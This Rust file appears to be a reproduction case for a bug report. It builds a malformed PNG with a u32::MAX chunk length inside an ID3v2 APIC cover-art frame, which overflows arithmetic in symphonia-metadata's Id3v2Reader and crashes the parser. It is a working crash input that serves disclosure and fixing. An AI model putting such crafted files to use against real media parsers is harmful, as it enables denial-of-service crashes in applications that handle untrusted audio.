//! Standalone reproduction for: arithmetic overflow (attempt to add with overflow) in
//! `symphonia-metadata`'s embedded-image parser, reached via the real standalone `Id3v2Reader`
//! public entry point parsing an `APIC` (attached picture) frame.

use std::io::Cursor;

use symphonia_core::io::MediaSourceStream;
use symphonia_core::meta::{MetadataOptions, MetadataReader};
use symphonia_metadata::id3v2::Id3v2Reader;

/// Build a minimal PNG buffer with an Indexed (palette) color type IHDR, followed by a bogus
/// ancillary chunk whose 32-bit length field is `u32::MAX`. `parse_png`'s indexed-color-type
/// loop computes `chunk_len + 4` in `u32` arithmetic before widening to `u64`, overflowing.
fn build_malicious_png() -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(b"\x89PNG\r\n\x1a\n"); // PNG signature (8 bytes)
    out.extend_from_slice(&0u32.to_be_bytes()); // IHDR chunk length field (ignored by parser)
    out.extend_from_slice(b"IHDR");
    out.extend_from_slice(&16u32.to_be_bytes()); // width
    out.extend_from_slice(&16u32.to_be_bytes()); // height
    out.push(8); // bit depth
    out.push(3); // color type = 3 (indexed / palette)
    out.extend_from_slice(&[0u8; 7]); // compression, filter, interlace methods + CRC (7 bytes)
    // Bogus ancillary chunk: length = u32::MAX, type = "abcd" (not tRNS/IDAT/IEND).
    out.extend_from_slice(&(u32::MAX).to_be_bytes());
    out.extend_from_slice(b"abcd");
    out
}

/// Wrap `png_data` in a real ID3v2.3 tag containing a single `APIC` frame, exactly as a real
/// ID3v2-tagged audio file would carry an embedded cover image.
fn build_id3v2_tag_with_apic(png_data: &[u8]) -> Vec<u8> {
    // APIC frame body: text encoding (1 byte) + null-terminated MIME type + picture type (1 byte)
    // + null-terminated description + image data.
    let mut apic_body = Vec::new();
    apic_body.push(0u8); // encoding: ISO-8859-1
    apic_body.extend_from_slice(b"image/png\0"); // MIME type
    apic_body.push(3u8); // picture type: front cover
    apic_body.push(0u8); // empty description, just the null terminator
    apic_body.extend_from_slice(png_data);

    let mut frame = Vec::new();
    frame.extend_from_slice(b"APIC");
    frame.extend_from_slice(&(apic_body.len() as u32).to_be_bytes());
    frame.extend_from_slice(&[0u8, 0u8]); // flags
    frame.extend_from_slice(&apic_body);

    let mut out = Vec::new();
    out.extend_from_slice(b"ID3");
    out.push(3); // major version (ID3v2.3)
    out.push(0); // minor version
    out.push(0); // flags
    let size = frame.len() as u32;
    // 28-bit syncsafe size.
    out.push(((size >> 21) & 0x7f) as u8);
    out.push(((size >> 14) & 0x7f) as u8);
    out.push(((size >> 7) & 0x7f) as u8);
    out.push((size & 0x7f) as u8);
    out.extend_from_slice(&frame);
    out
}

fn main() {
    let png = build_malicious_png();
    let data = build_id3v2_tag_with_apic(&png);
    println!("crafted ID3v2 tag with malicious APIC/PNG: {} bytes", data.len());

    let mss = MediaSourceStream::new(Box::new(Cursor::new(data)), Default::default());

    let mut reader = Id3v2Reader::try_new(mss, MetadataOptions::default())
        .expect("failed to construct Id3v2Reader");

    match reader.read_all() {
        Ok(_) => println!("parsed OK (no crash)"),
        Err(e) => println!("parse error (no crash): {e}"),
    }
}
